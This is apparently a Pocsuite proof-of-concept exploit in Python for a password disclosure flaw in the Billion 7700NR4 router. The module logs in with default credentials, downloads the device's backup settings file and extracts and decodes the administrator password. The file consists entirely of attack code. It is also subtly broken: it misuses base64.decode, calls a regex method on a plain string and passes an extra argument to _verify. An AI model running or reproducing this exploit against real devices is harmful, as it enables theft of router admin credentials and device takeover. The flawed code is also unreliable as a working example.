#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register
import re
import base64

class TestPOC(POCBase):
    name = "Billion 7700NR4 Password Disclosure"
    vulID = ''
    author = ['sebao']
    vulType = 'Password Disclosure'
    version = '1.0'  # default version: 1.0
    references = 'https://www.exploit-db.com/exploits/40472/'
    desc = 'Exploits Billion 7700NR4 password disclosure vulnerability that allows to fetch credentials for admin account'


    vulDate = ''
    createDate = '2017-10-16'
    updateDate = '2017-10-16'

    appName = 'Billion'
    appVersion = '7700NR4'
    dork = ''
    appPowerLink = 'http://www.billion.com/'
    samples = []

    def _attack(self):

        return self._verify(self)

    def _verify(self):
        '''verify mode'''
        result = {}
        url = self.url + '/backupsettings.conf'
        def_user = 'user'
        def_pass = 'user'
        resp = req.get(url,auth=(def_user,def_pass))
        res = re.findall('<AdminPassword>(.+?)</AdminPassword>', resp.content)
        if len(res):
            password = base64.decode(res[0])
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Password'] = password.group(1)
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
